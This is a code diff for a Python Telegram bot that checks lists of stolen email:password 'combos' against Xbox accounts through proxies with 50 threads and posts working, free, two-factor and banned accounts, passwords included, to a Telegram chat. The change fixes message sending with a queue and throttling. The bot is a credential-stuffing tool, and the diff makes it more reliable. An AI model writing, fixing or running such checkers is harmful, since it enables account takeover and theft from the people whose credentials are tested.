@@ -10,6 +10,7 @@ import uuid
 import threading
 import asyncio
 import concurrent.futures
+import random
 from datetime import datetime
 from urllib.parse import quote, unquote
 from telegram import Update, Bot
@@ -488,6 +489,22 @@ def format_proxy(proxy_line):
         pass
     return None
 
+# Message queue for thread-safe sending
+message_queue = asyncio.Queue()
+
+async def message_sender(bot, chat_id):
+    """Background task to send messages from queue"""
+    while True:
+        try:
+            msg_data = await message_queue.get()
+            if msg_data is None:  # Stop signal
+                break
+            text, parse_mode = msg_data
+            await bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
+        except Exception as e:
+            print(f"Message send error: {e}")
+            await asyncio.sleep(1)
+
 async def run_check(user_id, chat_id, context):
     global stats
     
@@ -512,6 +529,11 @@ async def run_check(user_id, chat_id, context):
     )
     
     checker = XboxChecker(debug=False)
+    
+    # Start message sender task
+    sender_task = asyncio.create_task(message_sender(context.bot, chat_id))
+    
+    results = []
     
     def process_combo(combo):
         if stats.stop_flag:
@@ -546,8 +568,7 @@ async def run_check(user_id, chat_id, context):
 📅 Renewal: {data.get('renewal_date', 'N/A')}
 
 checker by @zx_levi"""
-            
-            asyncio.run(context.bot.send_message(chat_id=chat_id, text=msg, parse_mode='Markdown'))
+            results.append((msg, 'Markdown'))
             
         elif status == "FREE":
             msg = f"""🆓 **XBOX FREE**
@@ -560,8 +581,7 @@ checker by @zx_levi"""
 🎁 Points: {data.get('rewards_points', 'N/A')}
 
 checker by @zx_levi"""
-            
-            asyncio.run(context.bot.send_message(chat_id=chat_id, text=msg, parse_mode='Markdown'))
+            results.append((msg, 'Markdown'))
             
         elif status == "2FACTOR":
             msg = f"""🔐 **2FA ACCOUNT**
@@ -569,7 +589,7 @@ checker by @zx_levi"""
 📧 `{email}:{password}`
 
 checker by @zx_levi"""
-            asyncio.run(context.bot.send_message(chat_id=chat_id, text=msg, parse_mode='Markdown'))
+            results.append((msg, 'Markdown'))
             
         elif status == "BANNED":
             msg = f"""🚫 **BANNED ACCOUNT**
@@ -577,16 +597,43 @@ checker by @zx_levi"""
 📧 `{email}:{password}`
 
 checker by @zx_levi"""
-            asyncio.run(context.bot.send_message(chat_id=chat_id, text=msg, parse_mode='Markdown'))
+            results.append((msg, 'Markdown'))
         
         stats.update(status)
     
+    # Run in thread pool
+    loop = asyncio.get_event_loop()
     with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-        futures = [executor.submit(process_combo, combo) for combo in lines]
+        futures = [loop.run_in_executor(executor, process_combo, combo) for combo in lines]
         
-        for future in concurrent.futures.as_completed(futures):
+        for i, future in enumerate(asyncio.as_completed(futures)):
             if stats.stop_flag:
                 break
+            await future
+            
+            # Send queued messages periodically
+            while results:
+                try:
+                    msg, parse_mode = results.pop(0)
+                    await message_queue.put((msg, parse_mode))
+                except:
+                    break
+            
+            # Small delay to prevent flooding
+            if i % 10 == 0:
+                await asyncio.sleep(0.1)
+    
+    # Send remaining messages
+    await asyncio.sleep(2)
+    while not message_queue.empty():
+        await asyncio.sleep(0.5)
+    
+    # Stop message sender
+    await message_queue.put(None)
+    try:
+        await asyncio.wait_for(sender_task, timeout=5)
+    except:
+        pass
     
     await context.bot.send_message(
         chat_id=chat_id,
@@ -606,6 +653,10 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     BOT_TOKEN = os.getenv("BOT_TOKEN")
+    
+    if not BOT_TOKEN:
+        print("Error: BOT_TOKEN environment variable not set!")
+        return
     
     application = Application.builder().token(BOT_TOKEN).build()
     
